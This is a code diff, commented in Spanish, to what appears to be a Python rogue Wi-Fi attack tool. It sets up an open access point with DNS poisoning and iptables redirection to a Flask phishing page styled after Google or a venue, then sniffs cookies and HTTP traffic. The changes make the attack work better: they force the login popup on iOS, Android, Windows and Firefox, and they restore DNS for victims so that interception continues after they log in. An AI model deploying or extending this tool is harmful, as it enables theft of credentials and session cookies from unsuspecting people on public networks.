@@ -14,9 +14,16 @@ HTTP para capturar cookies y credenciales en claro mientras navegan.
 Stack técnico:
   - hostapd    → AP abierto (sin contraseña) con el SSID elegido
   - dnsmasq    → DHCP + DNS poisoning (responde GATEWAY_IP a todo)
+                 DHCP option 114 anuncia la URL del portal (iOS 14+)
+                 local-ttl=0 evita que el OS cachee la detección
   - iptables   → DNAT TCP/80+443 al portal hasta el primer login;
-                 luego NAT hacia out_interface para dar internet real
-  - Flask      → sirve la página de phishing y recoge credenciales
+                 luego NAT hacia out_interface para dar internet real.
+                 DNS fix: DNAT UDP/TCP 53 de IPs autenticadas → 8.8.8.8
+                 (sin esto dnsmasq sigue respondiendo 10.0.0.1 a todo
+                 y el móvil "tiene internet" pero no resuelve nada)
+  - Flask      → sirve la página de phishing, rutas OS-probe que
+                 devuelven 302 para forzar el popup en iOS/Android/Win,
+                 y recoge credenciales
   - WireTrapSniffer → captura HTTP/cookies/DNS del tráfico post-login
 
 Requisitos en Kali:
@@ -42,6 +49,7 @@ DHCP_START   = "10.0.0.10"
 DHCP_END     = "10.0.0.100"
 SUBNET_MASK  = "255.255.255.0"
 FLASK_PORT   = 80
+UPSTREAM_DNS = "8.8.8.8"   # DNS real para víctimas autenticadas
 
 
 # ── Plantilla HTML: estilo Google ───────────────────────────────
@@ -215,10 +223,23 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 
 # ── Flask app ────────────────────────────────────────────────────
 
-def _build_flask_app(template_type, venue_name, creds_log,
+def _build_flask_app(gateway_ip, template_type, venue_name, creds_log,
                      on_credential=None, on_client_login=None):
+    """
+    Construye la app Flask del portal.
+
+    Incluye rutas de detección para cada SO:
+      - iOS/macOS: /hotspot-detect.html, /library/test/success.html
+      - Android:   /generate_204, /gen_204, /connectivitycheck
+      - Windows:   /connecttest.txt, /ncsi.txt
+      - Firefox:   /canonical.html
+
+    Estas rutas devuelven 302 al portal en lugar de la respuesta
+    esperada, lo que hace que el OS detecte un portal cautivo y
+    abra el popup automáticamente.
+    """
     try:
-        from flask import Flask, request, make_response
+        from flask import Flask, request, make_response, redirect
     except ImportError:
         return None
 
@@ -228,10 +249,40 @@ def _build_flask_app(template_type, venue_name, creds_log,
     portal_html = (_PORTAL_HTML_GOOGLE if template_type == "google"
                    else _PORTAL_HTML_VENUE).replace("{{ venue }}", venue_name)
 
-    @app.route("/", defaults={"path": ""})
-    @app.route("/<path:path>")
-    def catch_all(path):
-        return make_response(portal_html, 200)
+    portal_url = f"http://{gateway_ip}/"
+
+    # ── Rutas de detección OS (OS Captive Portal Probes) ──────────
+    # Devolver 302 en lugar de la respuesta esperada hace que el OS
+    # detecte el portal y muestre el popup de autenticación.
+
+    @app.route("/hotspot-detect.html")
+    @app.route("/library/test/success.html")
+    @app.route("/hotspot-detect")
+    def apple_probe():
+        """iOS/macOS espera '<html><body>Success</body></html>'."""
+        return redirect(portal_url, 302)
+
+    @app.route("/generate_204")
+    @app.route("/gen_204")
+    @app.route("/generate204")
+    @app.route("/connectivitycheck")
+    @app.route("/connectivitycheck.html")
+    def android_probe():
+        """Android espera HTTP 204 vacío."""
+        return redirect(portal_url, 302)
+
+    @app.route("/connecttest.txt")
+    @app.route("/ncsi.txt")
+    def windows_probe():
+        """Windows 10 espera 'Microsoft Connect Test'; NCSI legacy 'Microsoft NCSI'."""
+        return redirect(portal_url, 302)
+
+    @app.route("/canonical.html")
+    def firefox_probe():
+        """Firefox Network Connectivity Check."""
+        return redirect(portal_url, 302)
+
+    # ── Portal principal ──────────────────────────────────────────
 
     @app.route("/login", methods=["POST"])
     def login():
@@ -251,6 +302,11 @@ def _build_flask_app(template_type, venue_name, creds_log,
     def favicon():
         return "", 204
 
+    @app.route("/", defaults={"path": ""})
+    @app.route("/<path:path>")
+    def catch_all(path):
+        return make_response(portal_html, 200)
+
     return app
 
 
@@ -261,9 +317,11 @@ class CaptivePortal:
     Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.
 
     Flujo:
-      1. Víctima se conecta → portal de login (sin internet)
+      1. Víctima se conecta → OS detecta portal via probes HTTP → popup
       2. Víctima hace submit → credenciales capturadas
       3. Se activa NAT para su IP → tiene internet real
+         (DNS fix: su UDP/TCP 53 se redirige a 8.8.8.8 para que
+          los nombres resuelvan aunque dnsmasq siga envenenando)
       4. WireTrapSniffer captura cookies/HTTP mientras navega
     """
 
@@ -322,10 +380,33 @@ class CaptivePortal:
         self._log(f"hostapd.conf → {self._hostapd_conf}")
 
     def _write_dnsmasq_conf(self):
-        conf = (f"interface={self.interface}\nbind-interfaces\n"
-                f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},12h\n"
-                f"dhcp-option=3,{GATEWAY_IP}\ndhcp-option=6,{GATEWAY_IP}\n"
-                f"address=/#/{GATEWAY_IP}\nlog-dhcp\nno-resolv\n")
+        """
+        Genera la config de dnsmasq con:
+          - DNS poisoning: address=/#/GATEWAY_IP  (todo dominio → portal)
+          - DHCP option 114: anuncia la URL del portal cautivo directamente
+            en el DHCP. iOS 14+ abre el popup sin necesidad de HTTP probe.
+          - local-ttl=0: los clientes no cachean la detección del portal,
+            así el popup aparece siempre aunque el móvil ya se haya conectado
+            antes a esta red.
+          - Lease corta (5m): fuerza re-negociación rápida para re-detección.
+        """
+        conf = (
+            f"interface={self.interface}\n"
+            f"bind-interfaces\n"
+            f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},5m\n"
+            f"dhcp-option=3,{GATEWAY_IP}\n"
+            f"dhcp-option=6,{GATEWAY_IP}\n"
+            # DHCP option 114: RFC 7710 — Captive Portal URL
+            # iOS 14+ y algunos Android lo usan para abrir el popup
+            # sin necesidad de hacer el HTTP probe
+            f"dhcp-option=114,http://{GATEWAY_IP}/\n"
+            f"address=/#/{GATEWAY_IP}\n"
+            # TTL=0: evita que el OS cachee la resolución DNS del portal
+            # Crítico para que el popup aparezca en reconexiones
+            f"local-ttl=0\n"
+            f"log-dhcp\n"
+            f"no-resolv\n"
+        )
         open(self._dnsmasq_conf, "w").write(conf)
         self._log(f"dnsmasq.conf → {self._dnsmasq_conf}")
 
@@ -341,11 +422,18 @@ class CaptivePortal:
         self._log(f"Interfaz {self.interface} → {GATEWAY_IP}/24")
 
     def _setup_iptables_portal(self):
-        """Todo el tráfico HTTP/HTTPS va al Flask local. Sin internet."""
+        """
+        Configura iptables para el modo portal:
+          - DNAT TCP/80 y 443 al Flask local
+          - FORWARD DROP para todo el tráfico (sin internet)
+          - ESTABLISHED/RELATED ACCEPT para que el NAT funcione luego
+        """
         iface = self.interface
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
         subprocess.run(["iptables", "-F"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
+
+        # INPUT: permitir servicios locales del portal
         subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                        capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
@@ -354,6 +442,8 @@ class CaptivePortal:
                         "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                         "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)
+
+        # PREROUTING: redirigir HTTP y HTTPS al Flask portal
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "80",
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
@@ -362,40 +452,91 @@ class CaptivePortal:
                         "-i", iface, "-p", "tcp", "--dport", "443",
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                        capture_output=True)
+
+        # FORWARD: permitir paquetes de conexiones ya establecidas
+        # (necesario para que el NAT funcione cuando se conceda internet)
+        subprocess.run(["iptables", "-A", "FORWARD",
+                        "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
+                        "-j", "ACCEPT"], capture_output=True)
+
+        # FORWARD: bloquear todo lo demás (sin internet hasta el login)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
+
         self._log("iptables: modo portal (sin internet)")
 
     def _grant_internet(self, client_ip):
-        """Abre internet real para una IP que ya pasó el portal."""
+        """
+        Abre internet real para una IP que ya pasó el portal.
+
+        Problema resuelto:
+          dnsmasq tiene address=/#/GATEWAY_IP que envenena TODOS los dominios.
+          Aunque abramos el FORWARD y pongamos MASQUERADE, el móvil sigue
+          resolviendo google.com → 10.0.0.1 (portal) en lugar del IP real.
+          Solución: DNAT UDP/TCP 53 de esta IP al DNS real (8.8.8.8).
+          Así su DNS va directo a Google en lugar de pasar por dnsmasq.
+        """
         iface  = self.interface
         out_if = self.out_interface
 
-        # Quitar DROP genérico de FORWARD
+        # 1. Eliminar DROP genérico de FORWARD (lo re-añadimos al final)
         subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
-        # Excluir esta IP del DNAT (acceso directo a internet)
+
+        # 2. FIX DNS: redirigir consultas DNS de esta IP al upstream real
+        #    Insertar en posición 1 (antes del DNAT del portal)
         subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                        "-i", iface, "-s", client_ip, "-p", "tcp", "--dport", "80",
-                        "-j", "ACCEPT"], capture_output=True)
+                        "-i", iface, "-s", client_ip,
+                        "-p", "udp", "--dport", "53",
+                        "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
+                       capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                        "-i", iface, "-s", client_ip, "-p", "tcp", "--dport", "443",
-                        "-j", "ACCEPT"], capture_output=True)
-        # Permitir forward para esta IP
+                        "-i", iface, "-s", client_ip,
+                        "-p", "tcp", "--dport", "53",
+                        "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
+                       capture_output=True)
+
+        # 3. Excluir esta IP del DNAT HTTP/HTTPS al portal
+        #    RETURN en lugar de ACCEPT para que siga procesando (NAT saliente)
+        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                        "-i", iface, "-s", client_ip,
+                        "-p", "tcp", "--dport", "80", "-j", "RETURN"],
+                       capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                        "-i", iface, "-s", client_ip,
+                        "-p", "tcp", "--dport", "443", "-j", "RETURN"],
+                       capture_output=True)
+
+        # 4. Permitir FORWARD para esta IP (bidireccional)
         subprocess.run(["iptables", "-I", "FORWARD", "1",
-                        "-i", iface, "-s", client_ip, "-o", out_if, "-j", "ACCEPT"],
+                        "-i", iface, "-s", client_ip,
+                        "-o", out_if, "-j", "ACCEPT"],
                        capture_output=True)
         subprocess.run(["iptables", "-I", "FORWARD", "1",
-                        "-i", out_if, "-d", client_ip, "-o", iface, "-j", "ACCEPT"],
+                        "-i", out_if, "-d", client_ip,
+                        "-o", iface, "-j", "ACCEPT"],
                        capture_output=True)
-        # Re-añadir DROP al final (nuevas víctimas siguen sin internet)
+
+        # 5. Re-añadir DROP al final (nuevas víctimas siguen sin internet)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
-        # NAT saliente
+
+        # 6. NAT saliente para esta IP
         subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                         "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
                        capture_output=True)
-        self._log(f"[+] Internet concedido a {client_ip} via {out_if}")
+
+        # 7. Permitir que el DNS forwarded (ahora a 8.8.8.8) pueda salir
+        subprocess.run(["iptables", "-I", "FORWARD", "1",
+                        "-i", iface, "-s", client_ip,
+                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
+                       capture_output=True)
+        subprocess.run(["iptables", "-I", "FORWARD", "1",
+                        "-i", iface, "-s", client_ip,
+                        "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
+                       capture_output=True)
+
+        self._log(f"[+] Internet concedido a {client_ip} via {out_if} (DNS → {UPSTREAM_DNS})")
 
     def _clear_iptables(self):
         subprocess.run(["iptables", "-F"], capture_output=True)
@@ -454,6 +595,7 @@ class CaptivePortal:
             return False
 
         app = _build_flask_app(
+            gateway_ip=GATEWAY_IP,
             template_type=self.template_type,
             venue_name=self.venue_name,
             creds_log=self.captured_creds,
@@ -468,14 +610,16 @@ class CaptivePortal:
             try:
                 import logging as _lg
                 _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
-                app.run(host=GATEWAY_IP, port=FLASK_PORT,
+                # 0.0.0.0 en lugar de GATEWAY_IP para recibir peticiones
+                # a cualquier hostname que dnsmasq resuelva a GATEWAY_IP
+                app.run(host="0.0.0.0", port=FLASK_PORT,
                         threaded=True, use_reloader=False, debug=False)
             except Exception as ex:
                 self._err(f"Flask error: {ex}")
 
         self._flask_thread = threading.Thread(target=run_flask, daemon=True)
         self._flask_thread.start()
-        self._log(f"Flask portal en http://{GATEWAY_IP}:{FLASK_PORT}")
+        self._log(f"Flask portal en http://0.0.0.0:{FLASK_PORT}")
         return True
 
     def _start_sniffer(self):
